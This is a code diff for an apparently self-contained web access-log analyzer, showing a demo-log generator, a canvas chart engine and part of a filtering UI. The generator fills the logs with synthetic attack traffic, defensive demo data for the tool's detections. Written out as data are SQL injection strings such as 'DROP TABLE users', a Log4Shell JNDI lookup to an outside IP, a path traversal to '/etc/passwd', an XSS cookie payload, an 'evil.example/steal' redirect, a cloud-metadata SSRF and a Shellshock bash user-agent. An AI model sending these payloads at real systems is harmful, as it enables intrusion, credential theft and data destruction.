+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0 Safari/537.36",
+    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
+  ];
+  const PATHS = ["/", "/index.html", "/products", "/products/1042", "/products/2251", "/cart", "/checkout",
+    "/api/v1/session", "/api/v1/catalog?page=2", "/api/v1/orders", "/assets/app.js", "/assets/app.css",
+    "/assets/logo.svg", "/blog/2026/zero-trust", "/pricing", "/contact", "/search?q=firewall", "/health"];
+  const REFS = ["-", "https://www.google.com/", "https://vehcs.example/", "https://news.ycombinator.com/"];
+  const rnd = (a) => a[(Math.random() * a.length) | 0];
+  const T0 = Date.UTC(2026, 7, 18, 0, 0, 0);
+  const DAY = 86400000;
+
+  // --- baseline: diurnal traffic from ~700 sources over 24h -----------------
+  const clients = [];
+  for (let i = 0; i < 700; i++) clients.push("203.0." + (1 + Math.floor(i / 250)) + "." + (1 + (i % 250)));
+  for (let i = 0; i < 46000; i++){
+    const frac = i / 46000;
+    const wobble = 0.55 + 0.45 * Math.sin((frac * Math.PI * 2) - Math.PI / 2);
+    const t = T0 + frac * DAY + (Math.random() - 0.5) * 20000 * wobble;
+    const p = rnd(PATHS);
+    const roll = Math.random();
+    const status = roll > 0.965 ? 404 : roll > 0.955 ? 302 : roll > 0.95 ? 500 : 200;
+    const bytes = status === 200 ? 400 + ((Math.random() * 24000) | 0) : 180 + ((Math.random() * 900) | 0);
+    out.push(line(rnd(clients), t, Math.random() > 0.86 ? "POST" : "GET", p, status, bytes, rnd(REFS), rnd(UA)));
+  }
+
+  // --- incident 1: sqlmap injection sweep -----------------------------------
+  const atk1 = "45.83.91.14";
+  const inj = ["' OR 1=1--", "%27%20UNION%20SELECT%20NULL,version()--", "1 AND SLEEP(5)",
+    "'; DROP TABLE users--", "1' UNION SELECT username,password FROM users--", "%27%20OR%20%271%27%3D%271"];
+  for (let i = 0; i < 1400; i++){
+    const t = T0 + 9.2 * 3600000 + i * 1400 + Math.random() * 600;
+    const payload = encodeURIComponent(rnd(inj));
+    const url = rnd(["/products?id=", "/api/v1/orders?ref=", "/search?q="]) + payload;
+    out.push(line(atk1, t, "GET", url, Math.random() > 0.75 ? 500 : 403, 320, "-", "sqlmap/1.8.3#stable (https://sqlmap.org)"));
+  }
+
+  // --- incident 2: content discovery scan ------------------------------------
+  const atk2 = "185.220.101.77";
+  const wordlist = [".env", ".git/config", "wp-login.php", "phpmyadmin/", "admin/", "backup.sql", "config.json",
+    "server-status", "actuator/env", "web.config", ".DS_Store", "adminer.php", "old/", "test.php", "shell.php"];
+  for (let i = 0; i < 950; i++){
+    const t = T0 + 3.4 * 3600000 + i * 900;
+    const p = "/" + (i < wordlist.length ? wordlist[i] : "dir" + i + "/" + rnd(wordlist));
+    out.push(line(atk2, t, "GET", p, i < wordlist.length && Math.random() > 0.7 ? 200 : 404, 210, "-",
+      "Mozilla/5.0 (compatible; gobuster/3.6)"));
+  }
+
+  // --- incident 3: credential brute force ------------------------------------
+  const atk3 = "91.234.19.203";
+  for (let i = 0; i < 480; i++){
+    const t = T0 + 14.1 * 3600000 + i * 2200;
+    out.push(line(atk3, t, "POST", "/wp-login.php", i === 470 ? 302 : 401, 260, "https://vehcs.example/wp-login.php",
+      "python-requests/2.32.2"));
+  }
+
+  // --- incident 4: implant beacon (60s cadence, low jitter) -------------------
+  const atk4 = "10.14.7.31";
+  for (let i = 0; i < 620; i++){
+    const t = T0 + 2 * 3600000 + i * 60000 + (Math.random() - 0.5) * 900;
+    out.push(line(atk4, t, "POST", "/api/v2/heartbeat?id=7f3a9c", 200, 96 + ((Math.random() * 30) | 0), "-", "curl/8.4.0"));
+  }
+
+  // --- incident 5: bulk export / exfiltration --------------------------------
+  const atk5 = "10.14.9.88";
+  for (let i = 0; i < 26; i++){
+    const t = T0 + 18 * 3600000 + i * 90000;
+    out.push(line(atk5, t, "GET", "/admin/export?table=customers&format=csv", 200, 92 * 1048576, "-",
+      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36"));
+  }
+
+  // --- incident 6: opportunistic probes (log4shell, traversal, LFI, XSS) ------
+  const probes = [
+    ["/api/v1/session", "${jndi:ldap://45.9.148.11/a}"],
+    ["/", "/..%2f..%2f..%2fetc%2fpasswd"],
+    ["/index.php?page=", "php://filter/convert.base64-encode/resource=index"],
+    ["/search?q=", "%3Cscript%3Ealert(document.cookie)%3C/script%3E"],
+    ["/redirect?url=", "http%3A%2F%2Fevil.example%2Fsteal"],
+    ["/meta?url=", "http://169.254.169.254/latest/meta-data/iam/"]
+  ];
+  const probeIps = ["104.28.7.19", "141.98.11.4", "62.204.41.9", "5.181.86.10", "193.32.162.7"];
+  for (let i = 0; i < 420; i++){
+    const t = T0 + Math.random() * DAY;
+    const pr = rnd(probes);
+    out.push(line(rnd(probeIps), t, "GET", pr[0] + pr[1], rnd([400, 404, 403, 500]), 240, "-",
+      rnd(["curl/7.88.1", "() { :; }; /bin/bash -c 'id'", "Mozilla/5.0 zgrab/0.x", "Nikto/2.5.0"])));
+  }
+
+  // --- incident 7: 5xx burst from a failing dependency -------------------------
+  for (let i = 0; i < 900; i++){
+    const t = T0 + 20.5 * 3600000 + i * 800;
+    out.push(line(rnd(clients), t, "GET", "/api/v1/orders", 503, 190, "-", rnd(UA)));
+  }
+
+  out.sort(() => Math.random() - 0.5);   // arrival order is never perfectly sorted
+  return out.join("\n") + "\n";
+}
+
+function loadDemo(){
+  const text = buildDemoLog();
+  const file = new File([text], "demo-access.log", { type:"text/plain" });
+  Ingest.add([file]);
+}
+</script>
+<script>
+"use strict";
+/* ============================================================================
+   CHART ENGINE
+   Hand-rolled canvas primitives — no chart library, no CDN, no runtime cost
+   beyond what is drawn. Every chart registers hit regions so one shared
+   tooltip can serve them all.
+   ========================================================================== */
+const CLR = {
+  s2:"#3ddc97", s3:"#a78bfa", s4:"#ffb703", s5:"#ff5d73", s0:"#5c6784",
+  azure:"#4cc9f0", grid:"rgba(255,255,255,.06)", axis:"#5c6784", text:"#8e9ab8"
+};
+const STATUS_SERIES = [
+  { key:2, label:"2xx", color:CLR.s2 },
+  { key:3, label:"3xx", color:CLR.s3 },
+  { key:4, label:"4xx", color:CLR.s4 },
+  { key:5, label:"5xx", color:CLR.s5 },
+  { key:0, label:"other", color:CLR.s0 }
+];
+
+const tip = document.createElement("div");
+tip.style.cssText = "position:fixed;z-index:200;pointer-events:none;display:none;background:#0f1626;" +
+  "border:1px solid #2a3550;border-radius:6px;padding:6px 10px;font:12px/1.45 var(--font-mono);" +
+  "color:#e7ecf7;box-shadow:0 10px 30px -12px #000;max-width:420px;white-space:pre-line";
+document.body.appendChild(tip);
+function showTip(x, y, html){
+  tip.innerHTML = html; tip.style.display = "block";
+  const r = tip.getBoundingClientRect();
+  tip.style.left = Math.min(window.innerWidth - r.width - 10, x + 14) + "px";
+  tip.style.top = Math.max(8, y - r.height - 12) + "px";
+}
+function hideTip(){ tip.style.display = "none"; }
+
+function surface(cv, hpx){
+  const dpr = window.devicePixelRatio || 1;
+  const w = cv.clientWidth || cv.parentNode.clientWidth || 320;
+  const h = hpx || cv.clientHeight || 220;
+  cv.width = Math.max(1, Math.round(w * dpr));
+  cv.height = Math.max(1, Math.round(h * dpr));
+  const ctx = cv.getContext("2d");
+  ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
+  ctx.clearRect(0, 0, w, h);
+  ctx.font = "11px var(--font-mono), monospace";
+  ctx.textBaseline = "middle";
+  cv._hit = [];
+  if (!cv.hasAttribute("data-custom-hover")) bindHover(cv);
+  return { ctx, w, h };
+}
+function bindHover(cv){
+  if (cv._bound) return;
+  cv._bound = true;
+  cv.addEventListener("mousemove", e => {
+    const r = cv.getBoundingClientRect(), x = e.clientX - r.left, y = e.clientY - r.top;
+    const hit = (cv._hit || []).find(h => x >= h.x && x <= h.x + h.w && y >= h.y && y <= h.y + h.h);
+    if (hit){ cv.style.cursor = hit.click ? "pointer" : "default"; showTip(e.clientX, e.clientY, hit.tip); }
+    else { cv.style.cursor = "default"; hideTip(); }
+  });
+  cv.addEventListener("mouseleave", hideTip);
+  cv.addEventListener("click", e => {
+    const r = cv.getBoundingClientRect(), x = e.clientX - r.left, y = e.clientY - r.top;
+    const hit = (cv._hit || []).find(h => h.click && x >= h.x && x <= h.x + h.w && y >= h.y && y <= h.y + h.h);
+    if (hit) hit.click();
+  });
+}
+function fitText(ctx, s, maxW){
+  if (ctx.measureText(s).width <= maxW) return s;
+  let lo = 1, hi = s.length;
+  while (lo < hi){
+    const mid = (lo + hi + 1) >> 1;
+    if (ctx.measureText(s.slice(0, mid) + "…").width <= maxW) lo = mid; else hi = mid - 1;
+  }
+  return s.slice(0, lo) + "…";
+}
+function niceMax(v){
+  if (v <= 0) return 1;
+  const exp = Math.pow(10, Math.floor(Math.log10(v)));
+  const f = v / exp;
+  return (f <= 1 ? 1 : f <= 2 ? 2 : f <= 2.5 ? 2.5 : f <= 5 ? 5 : 10) * exp;
+}
+function tickLabel(ms, span){
+  const d = new Date(ms), p = n => String(n).padStart(2, "0");
+  if (span > 5 * 86400000) return p(d.getUTCMonth()+1) + "/" + p(d.getUTCDate());
+  if (span > 2 * 3600000) return p(d.getUTCDate()) + " " + p(d.getUTCHours()) + ":" + p(d.getUTCMinutes());
+  return p(d.getUTCHours()) + ":" + p(d.getUTCMinutes()) + ":" + p(d.getUTCSeconds());
+}
+
+/* -------------------------------------------------------- SIGNAL  STRIP --- */
+const Strip = {
+  cv:null, metric:"requests", buckets:null, bucketMs:0, t0:0,
+  brush:null, dragging:null, geom:null,
+
+  init(){
+    this.cv = document.getElementById("strip");
+    const cv = this.cv;
+    cv.addEventListener("mousedown", e => {
+      if (!this.geom) return;
+      const x = e.clientX - cv.getBoundingClientRect().left;
+      this.dragging = { a:x, b:x }; this.draw();
+    });
+    window.addEventListener("mousemove", e => {
+      if (!this.dragging || !this.geom) return;
+      this.dragging.b = e.clientX - cv.getBoundingClientRect().left;
+      this.draw();
+    });
+    window.addEventListener("mouseup", () => {
+      if (!this.dragging) return;
+      const { a, b } = this.dragging; this.dragging = null;
+      if (Math.abs(a - b) < 6){ this.brush = null; }
+      else {
+        const t1 = this.xToTime(Math.min(a, b)), t2 = this.xToTime(Math.max(a, b));
+        this.brush = { from:t1, to:t2 };
+      }
+      UI.applyFilters();
+      this.draw();
+    });
+    cv.addEventListener("mousemove", e => {
+      if (!this.geom || this.dragging) return;
+      const rect = cv.getBoundingClientRect(), x = e.clientX - rect.left;
+      const i = this.xToIndex(x);
+      if (i < 0 || !this.buckets || i >= this.buckets.n){ hideTip(); return; }
+      const b = this.buckets;
+      const t = this.t0 + i * this.bucketMs;
+      let body = "<b>" + fmtTime(t) + "</b>\n";
+      if (this.metric === "bytes") body += fmtBytes(b.bytes[i]) + " transferred";
+      else if (this.metric === "threats") body += fmtInt(b.threat[i]) + " flagged events";
+      else {
+        body += fmtInt(b.total[i]) + " requests\n";
+        body += "2xx " + fmtInt(b.c2[i]) + " · 3xx " + fmtInt(b.c3[i]) + " · 4xx " + fmtInt(b.c4[i]) + " · 5xx " + fmtInt(b.c5[i]);
+      }
+      showTip(e.clientX, e.clientY, body);
+    });
+    cv.addEventListener("mouseleave", hideTip);
+    document.querySelectorAll("#stripPanel .seg button").forEach(b => {
+      b.addEventListener("click", () => {
+        document.querySelectorAll("#stripPanel .seg button").forEach(x => x.setAttribute("aria-pressed", String(x === b)));
+        this.metric = b.dataset.metric; this.draw();
+      });
+    });
+    document.getElementById("btnClearBrush").addEventListener("click", () => {
+      this.brush = null; UI.applyFilters(); this.draw();
+    });
+  },
+
+  /* buckets are computed from the *unfiltered* store so the strip stays a
+     stable map of the whole capture while the view narrows */
+  build(){
+    const S = Store, n = S.n;
+    const min = Analytics.minTs, max = Analytics.maxTs;
+    if (!n || !max){ this.buckets = null; return; }
+    const span = Math.max(1000, max - min);
+    const target = Math.max(120, Math.min(720, Math.floor((this.cv.clientWidth || 900) / 2)));
+    let bucketMs = Math.max(1000, Math.ceil(span / target / 1000) * 1000);
+    const count = Math.min(4000, Math.ceil(span / bucketMs) + 1);
+    const b = {
+      n:count, total:new Float64Array(count), c2:new Float64Array(count), c3:new Float64Array(count),
+      c4:new Float64Array(count), c5:new Float64Array(count), c0:new Float64Array(count),
+      bytes:new Float64Array(count), threat:new Float64Array(count)
+    };
+    const NOISE = (1 << BITS.automation_ua) | (1 << BITS.empty_ua) | (1 << BITS.auth_failure) | (1 << BITS.long_url);
+    for (let r = 0; r < n; r++){
+      const ts = S.ts[r];
+      if (!ts) continue;
+      let i = Math.floor((ts - min) / bucketMs);
+      if (i < 0) i = 0; else if (i >= count) i = count - 1;
+      b.total[i]++; b.bytes[i] += S.bytes[r];
+      const st = S.status[r];
+      if (st >= 500) b.c5[i]++; else if (st >= 400) b.c4[i]++; else if (st >= 300) b.c3[i]++;
+      else if (st >= 200) b.c2[i]++; else b.c0[i]++;
+      if (S.flags[r] & ~NOISE) b.threat[i]++;
+    }
+    this.buckets = b; this.bucketMs = bucketMs; this.t0 = min;
+  },
+
+  xToIndex(x){
+    if (!this.geom) return -1;
+    const g = this.geom;
+    return Math.round((x - g.left) / g.plotW * (this.buckets.n - 1));
+  },
+  xToTime(x){
+    const g = this.geom;
+    const f = Math.max(0, Math.min(1, (x - g.left) / g.plotW));
+    return this.t0 + f * (this.buckets.n - 1) * this.bucketMs;
+  },
+  timeToX(t){
+    const g = this.geom, span = (this.buckets.n - 1) * this.bucketMs || 1;
+    return g.left + ((t - this.t0) / span) * g.plotW;
+  },
+
+  draw(){
+    const cv = this.cv;
+    if (!cv) return;
+    const { ctx, w, h } = surface(cv, 132);
+    const b = this.buckets;
+    if (!b){ ctx.fillStyle = CLR.text; ctx.fillText("No timestamps parsed", 12, h / 2); this.geom = null; return; }
+    const left = 52, right = 10, top = 12, bottom = 20;
+    const plotW = w - left - right, plotH = h - top - bottom;
+    this.geom = { left, top, plotW, plotH };
+
+    /* y scale */
+    let max = 0;
+    if (this.metric === "bytes") for (let i = 0; i < b.n; i++) max = Math.max(max, b.bytes[i]);
+    else if (this.metric === "threats") for (let i = 0; i < b.n; i++) max = Math.max(max, b.threat[i]);
+    else for (let i = 0; i < b.n; i++) max = Math.max(max, b.total[i]);
+    max = niceMax(max || 1);
+
+    /* grid + y labels */
+    ctx.strokeStyle = CLR.grid; ctx.fillStyle = CLR.text; ctx.lineWidth = 1;
+    ctx.textAlign = "right";
+    for (let g = 0; g <= 2; g++){
+      const y = top + plotH - (g / 2) * plotH;
+      ctx.beginPath(); ctx.moveTo(left, y + .5); ctx.lineTo(w - right, y + .5); ctx.stroke();
+      const v = (g / 2) * max;
+      ctx.fillText(this.metric === "bytes" ? fmtBytes(v) : fmtInt(v), left - 8, y);
+    }
+
+    const xOf = i => left + (b.n === 1 ? plotW / 2 : (i / (b.n - 1)) * plotW);
+    const yOf = v => top + plotH - (v / max) * plotH;
+
+    if (this.metric === "requests"){
+      const series = [b.c2, b.c3, b.c4, b.c5, b.c0];
+      const colors = [CLR.s2, CLR.s3, CLR.s4, CLR.s5, CLR.s0];
+      const acc = new Float64Array(b.n);
+      for (let s = 0; s < series.length; s++){
+        ctx.beginPath();
+        ctx.moveTo(xOf(0), yOf(acc[0]));
+        for (let i = 0; i < b.n; i++) ctx.lineTo(xOf(i), yOf(acc[i] + series[s][i]));
+        for (let i = b.n - 1; i >= 0; i--) ctx.lineTo(xOf(i), yOf(acc[i]));
+        ctx.closePath();
+        ctx.fillStyle = colors[s] + "55"; ctx.fill();
+        ctx.strokeStyle = colors[s]; ctx.lineWidth = 1; ctx.stroke();
+        for (let i = 0; i < b.n; i++) acc[i] += series[s][i];
+      }
+    } else {
+      const arr = this.metric === "bytes" ? b.bytes : b.threat;
+      const color = this.metric === "bytes" ? CLR.azure : CLR.s5;
+      ctx.beginPath();
+      ctx.moveTo(xOf(0), top + plotH);
+      for (let i = 0; i < b.n; i++) ctx.lineTo(xOf(i), yOf(arr[i]));
+      ctx.lineTo(xOf(b.n - 1), top + plotH); ctx.closePath();
+      ctx.fillStyle = color + "33"; ctx.fill();
+      ctx.beginPath();
+      for (let i = 0; i < b.n; i++){ const x = xOf(i), y = yOf(arr[i]); i ? ctx.lineTo(x, y) : ctx.moveTo(x, y); }
+      ctx.strokeStyle = color; ctx.lineWidth = 1.4; ctx.stroke();
+    }
+
+    /* x axis */
+    ctx.textAlign = "center"; ctx.fillStyle = CLR.text;
+    const span = (b.n - 1) * this.bucketMs;
+    for (let k = 0; k <= 5; k++){
+      const i = Math.round((k / 5) * (b.n - 1));
+      ctx.fillText(tickLabel(this.t0 + i * this.bucketMs, span), xOf(i), h - 9);
+    }
+
+    /* brush + live drag */
+    const paintBrush = (x1, x2, live) => {
+      const a = Math.max(left, Math.min(x1, x2)), bx = Math.min(w - right, Math.max(x1, x2));
+      ctx.fillStyle = live ? "rgba(76,201,240,.18)" : "rgba(76,201,240,.13)";
+      ctx.fillRect(a, top, bx - a, plotH);
+      ctx.strokeStyle = CLR.azure; ctx.lineWidth = 1;
+      ctx.beginPath(); ctx.moveTo(a + .5, top); ctx.lineTo(a + .5, top + plotH);
+      ctx.moveTo(bx - .5, top); ctx.lineTo(bx - .5, top + plotH); ctx.stroke();
+    };
+    if (this.dragging) paintBrush(this.dragging.a, this.dragging.b, true);
+    else if (this.brush) paintBrush(this.timeToX(this.brush.from), this.timeToX(this.brush.to), false);
+
+    const info = document.getElementById("brushInfo");
+    if (this.brush){
+      info.classList.remove("hidden");
+      info.textContent = fmtTime(this.brush.from) + "  →  " + fmtTime(this.brush.to) + "   (" + fmtDur(this.brush.to - this.brush.from) + ")";
+    } else info.classList.add("hidden");
+
+    /* legend */
+    const legend = document.getElementById("stripLegend");
+    if (this.metric === "requests"){
+      legend.innerHTML = STATUS_SERIES.map(s => '<span><i style="background:' + s.color + '"></i>' + s.label + "</span>").join("") +
+        '<span style="margin-left:auto;color:var(--faint)">bucket ' + fmtDur(this.bucketMs) + " · " + fmtInt(b.n) + " buckets</span>";
+    } else if (this.metric === "bytes"){
+      legend.innerHTML = '<span><i style="background:' + CLR.azure + '"></i>bytes returned</span>' +
+        '<span style="margin-left:auto;color:var(--faint)">bucket ' + fmtDur(this.bucketMs) + "</span>";
+    } else {
+      legend.innerHTML = '<span><i style="background:' + CLR.s5 + '"></i>events carrying a detection (noise rules excluded)</span>' +
+        '<span style="margin-left:auto;color:var(--faint)">bucket ' + fmtDur(this.bucketMs) + "</span>";
+    }
+  }
+};
+
+/* --------------------------------------------------------------- donut ---- */
+function donut(cv, items, centerLabel){
+  const { ctx, w, h } = surface(cv, 230);
+  const total = items.reduce((a, b) => a + b.value, 0);
+  if (!total){ ctx.fillStyle = CLR.text; ctx.textAlign = "center"; ctx.fillText("no data", w / 2, h / 2); return; }
+  const cx = Math.min(w * .34, 110), cy = h / 2, R = Math.min(cy - 12, cx - 6), r = R * .62;
+  let a0 = -Math.PI / 2;
+  items.forEach(it => {
+    const a1 = a0 + (it.value / total) * Math.PI * 2;
+    ctx.beginPath(); ctx.moveTo(cx, cy);
+    ctx.arc(cx, cy, R, a0, a1); ctx.closePath();
+    ctx.fillStyle = it.color; ctx.fill();
+    a0 = a1;
+  });
+  ctx.globalCompositeOperation = "destination-out";
+  ctx.beginPath(); ctx.arc(cx, cy, r, 0, Math.PI * 2); ctx.fill();
+  ctx.globalCompositeOperation = "source-over";
+  ctx.textAlign = "center"; ctx.fillStyle = "#e7ecf7";
+  ctx.font = "600 17px var(--font-mono), monospace";
+  ctx.fillText(fmtInt(total), cx, cy - 4);
+  ctx.font = "10px var(--font-mono), monospace"; ctx.fillStyle = CLR.text;
+  ctx.fillText(centerLabel || "events", cx, cy + 12);
+
+  /* legend column */
+  ctx.textAlign = "left";
+  const lx = cx + R + 22;
+  items.forEach((it, i) => {
+    const y = 26 + i * 21;
+    if (y > h - 8) return;
+    ctx.fillStyle = it.color; ctx.fillRect(lx, y - 5, 10, 10);
+    const availW = w - 8 - (lx + 17);
+    ctx.font = "12px var(--font-ui), sans-serif";
+    const label = fitText(ctx, it.label, Math.max(30, availW * 0.5));
+    const labelW = ctx.measureText(label).width;
+    ctx.font = "11px var(--font-mono), monospace";
+    let valueText = fmtInt(it.value) + "  " + (100 * it.value / total).toFixed(1) + "%";
+    if (labelW + 14 + ctx.measureText(valueText).width > availW) valueText = fmtInt(it.value);
+    ctx.fillStyle = CLR.text; ctx.textAlign = "right";
+    ctx.fillText(valueText, w - 8, y);
+    ctx.textAlign = "left"; ctx.fillStyle = "#e7ecf7"; ctx.font = "12px var(--font-ui), sans-serif";
+    ctx.fillText(label, lx + 17, y);
+    cv._hit.push({ x:lx, y:y - 9, w:w - lx - 8, h:18, tip:it.label + "\n" + fmtInt(it.value) + " events", click:it.click });
+  });
+}
+
+/* ------------------------------------------------------ horizontal bars --- */
+function hbar(cv, items, opts){
+  opts = opts || {};
+  const rows = items.length;
+  const { ctx, w, h } = surface(cv, opts.height || 230);
+  if (!rows){ ctx.fillStyle = CLR.text; ctx.textAlign = "center"; ctx.fillText("no data", w / 2, h / 2); return; }
+  const max = Math.max.apply(null, items.map(i => i.value)) || 1;
+  const rowH = Math.min(30, (h - 8) / rows);
+  const labelW = Math.min(opts.labelW || 190, w * .48);
+  const valueW = 74;
+  items.forEach((it, i) => {
+    const y = 4 + i * rowH, bh = Math.max(7, rowH - 10);
+    ctx.fillStyle = CLR.text; ctx.textAlign = "left";
+    ctx.font = "11px var(--font-mono), monospace";
+    const label = it.label.length > 38 ? it.label.slice(0, 18) + "…" + it.label.slice(-18) : it.label;
+    ctx.fillText(label, 2, y + rowH / 2);
+    const bx = labelW + 6, bw = Math.max(1, (w - labelW - valueW - 12) * (it.value / max));
+    ctx.fillStyle = it.color || CLR.azure;
+    ctx.beginPath();
+    if (ctx.roundRect) ctx.roundRect(bx, y + (rowH - bh) / 2, bw, bh, 3); else ctx.rect(bx, y + (rowH - bh) / 2, bw, bh);
+    ctx.fill();
+    ctx.fillStyle = "#e7ecf7"; ctx.textAlign = "right";
+    ctx.fillText(opts.fmt ? opts.fmt(it.value) : fmtInt(it.value), w - 4, y + rowH / 2);
+    cv._hit.push({ x:0, y, w, h:rowH, tip:(it.tip || it.label) + "\n" + (opts.fmt ? opts.fmt(it.value) : fmtInt(it.value)), click:it.click });
+  });
+}
+
+/* --------------------------------------------------------------- heatmap -- */
+function heatmap(cv, matrix, opts){
+  const { ctx, w, h } = surface(cv, opts && opts.height || 290);
+  const days = ["Sun","Mon","Tue","Wed","Thu","Fri","Sat"];
+  const left = 42, top = 22, right = 12, bottom = 26;
+  const cw = (w - left - right) / 24, ch = (h - top - bottom) / 7;
+  let max = 0;
+  for (let d = 0; d < 7; d++) for (let hh = 0; hh < 24; hh++) max = Math.max(max, matrix[d][hh]);
+  ctx.font = "10px var(--font-mono), monospace";
+  for (let d = 0; d < 7; d++){
+    ctx.fillStyle = CLR.text; ctx.textAlign = "right";
+    ctx.fillText(days[d], left - 8, top + d * ch + ch / 2);
+    for (let hh = 0; hh < 24; hh++){
+      const v = matrix[d][hh];
+      const t = max ? Math.pow(v / max, .55) : 0;
+      const x = left + hh * cw, y = top + d * ch;
+      ctx.fillStyle = v ? "rgba(76,201,240," + (0.08 + t * 0.92).toFixed(3) + ")" : "rgba(255,255,255,.03)";
+      ctx.fillRect(x + 1, y + 1, cw - 2, ch - 2);
+      if (v) cv._hit.push({ x, y, w:cw, h:ch, tip:days[d] + " " + String(hh).padStart(2, "0") + ":00 UTC\n" + fmtInt(v) + " events" });
+    }
+  }
+  ctx.fillStyle = CLR.text; ctx.textAlign = "center";
+  for (let hh = 0; hh < 24; hh += 2) ctx.fillText(String(hh).padStart(2, "0"), left + hh * cw + cw / 2, h - 12);
+  ctx.textAlign = "left";
+  ctx.fillText("peak " + fmtInt(max) + " events/hour-cell", left, 10);
+}
+
+/* ------------------------------------------------------------ histogram --- */
+function histogram(cv, bins, labels, opts){
+  const { ctx, w, h } = surface(cv, opts && opts.height || 230);
+  const left = 46, right = 10, top = 12, bottom = 30;
+  const plotW = w - left - right, plotH = h - top - bottom;
+  const max = niceMax(Math.max.apply(null, bins) || 1);
+  ctx.strokeStyle = CLR.grid;
+  for (let g = 0; g <= 2; g++){
+    const y = top + plotH - (g / 2) * plotH;
+    ctx.beginPath(); ctx.moveTo(left, y + .5); ctx.lineTo(w - right, y + .5); ctx.stroke();
+    ctx.fillStyle = CLR.text; ctx.textAlign = "right";
+    ctx.fillText(fmtInt((g / 2) * max), left - 7, y);
+  }
+  const bw = plotW / bins.length;
+  bins.forEach((v, i) => {
+    const bh = (v / max) * plotH, x = left + i * bw, y = top + plotH - bh;
+    ctx.fillStyle = CLR.azure + "cc";
+    ctx.fillRect(x + 2, y, Math.max(1, bw - 4), bh);
+    cv._hit.push({ x, y:top, w:bw, h:plotH, tip:labels[i] + "\n" + fmtInt(v) + " responses" });
+  });
+  ctx.fillStyle = CLR.text; ctx.textAlign = "center";
+  ctx.font = "9.5px var(--font-mono), monospace";
+  labels.forEach((l, i) => ctx.fillText(fitText(ctx, l, bw - 2), left + i * bw + bw / 2, h - 12));
+}
+</script>
+<script>
+"use strict";
+/* ============================================================================
+   UI LAYER
+   ========================================================================== */
+const NOISE_MASK = (1 << BITS.automation_ua) | (1 << BITS.empty_ua) | (1 << BITS.long_url) | (1 << BITS.auth_failure);
+
+const COLUMNS = [
+  { key:"ts",     label:"Time (UTC)" },
+  { key:"ip",     label:"Source" },
+  { key:"method", label:"Verb" },
+  { key:"url",    label:"Request" },
+  { key:"status", label:"Code" },
+  { key:"bytes",  label:"Bytes" },
+  { key:"ua",     label:"Client" },
+  { key:"flags",  label:"Detections" }
+];
+
+const EXAMPLES = [
+  "flag:critical",
+  "status >= 500",
+  'ua ~ "sqlmap|nikto|gobuster"',
+  "url:.env OR url:wp-login",
+  "flag:beaconing",
+  "bytes > 10mb",
+  "ip = 10.0.0.0/8 AND flag:any",
+  "method = POST AND status = 401",
+  'NOT ua : "Mozilla"',
+  "time > -6h"
+];
+
+function toast(msg, isErr){
+  const el = document.createElement("div");
+  el.className = "toast" + (isErr ? " err" : "");
+  el.textContent = msg;
+  document.getElementById("toasts").appendChild(el);
+  setTimeout(() => { el.style.opacity = "0"; el.style.transition = "opacity .3s"; setTimeout(() => el.remove(), 320); }, 4200);
+}
+
+const UI = {
+  view:new Uint32Array(0),
+  sortKey:"ts", sortDir:1,
+  pred:null,
+  facetStatus:new Set(),
+  detectionsOnly:false,
+  rowH:28, lastStart:-1, selected:-1,
+  agg:null,
+
+  /* ------------------------------------------------------------- queue --- */
+  addQueueRow(rec){
+    const el = document.createElement("div");
+    el.className = "qrow"; el.id = "q" + rec.id;
+    el.innerHTML =
+      '<div class="nm"></div>' +
+      '<div><div class="bar"><i></i></div></div>' +
+      '<div class="meta"></div>' +
+      '<div class="fmt"></div>' +
+      '<div class="st"></div>';
+    el.querySelector(".nm").textContent = rec.name;
+    document.getElementById("queue").appendChild(el);
+    rec.el = el;
+    this.updateQueueRow(rec);
+  },
+  updateQueueRow(rec){
+    if (!rec.el) return;
+    const pct = rec.size ? Math.min(100, 100 * rec.bytes / rec.size) : (rec.state === "done" ? 100 : 0);
+    rec.el.querySelector(".bar i").style.width = (rec.state === "done" ? 100 : pct) + "%";
+    rec.el.querySelector(".meta").textContent = fmtBytes(rec.size) + " · " + fmtInt(rec.lines) + " lines";
+    rec.el.querySelector(".fmt").textContent = rec.format === "—" ? "" : rec.format.replace("_", " ");
+    const st = rec.el.querySelector(".st");
+    st.className = "st " + (rec.state === "running" ? "run" : rec.state === "done" ? "done" : rec.state === "error" ? "err" : "");
+    st.title = rec.error || rec.state;
+  },
+  showIngestUI(){
+    document.getElementById("fWorkers").textContent = Ingest.useInline ? "inline (fallback)" : String(Ingest.max);
+  },
+  liveStats(){
+    document.getElementById("tsFiles").textContent = fmtInt(Files.list.length);
+    document.getElementById("tsLines").textContent = fmtInt(Ingest.lines);
+    document.getElementById("tsRows").textContent = fmtInt(Store.n);
+    const secs = (performance.now() - Ingest.t0) / 1000;
+    document.getElementById("tsRate").textContent = secs > 0.2 ? fmtBytes(Ingest.bytes / secs) + "/s" : "—";
+    document.getElementById("tsMem").textContent = fmtBytes(Store.bytesUsed());
+  },
+
+  /* -------------------------------------------------------- full render -- */
+  renderAll(){
+    ["stripPanel","kpis","analysis","charts","explorer"].forEach(id => document.getElementById(id).classList.remove("hidden"));
+    document.getElementById("intake").classList.add("compact");
+    Strip.build();
+    this.renderFindings();
+    this.renderActors();
+    this.applyFilters();
+    this.liveStats();
+  },
+
+  /* ----------------------------------------------------------- filtering - */
+  applyFilters(){
+    const S = Store, n = S.n;
+    const q = document.getElementById("q").value.trim();
+    const err = document.getElementById("qerr");
+    let pred = null;
+    if (q){
+      try { pred = compileQuery(q); err.textContent = ""; }
+      catch (e){
+        err.textContent = "Query: " + (e.msg || e.message || e) + (e.p !== undefined ? "  (at " + e.p + ")" : "");
+        return;
+      }
+    } else err.textContent = "";
+
+    const brush = Strip.brush;
+    const fs = this.facetStatus, useFs = fs.size > 0;
+    const detOnly = this.detectionsOnly;
+    const out = new Uint32Array(n);
+    let k = 0;
+    for (let r = 0; r < n; r++){
+      if (brush){ const t = S.ts[r]; if (!t || t < brush.from || t > brush.to) continue; }
+      if (useFs){ let c = Math.floor(S.status[r] / 100); if (c === 1) c = 0; if (!fs.has(c)) continue; }
+      if (detOnly && !(S.flags[r] & ~NOISE_MASK)) continue;
+      if (pred && !pred(r)) continue;
+      out[k++] = r;
+    }
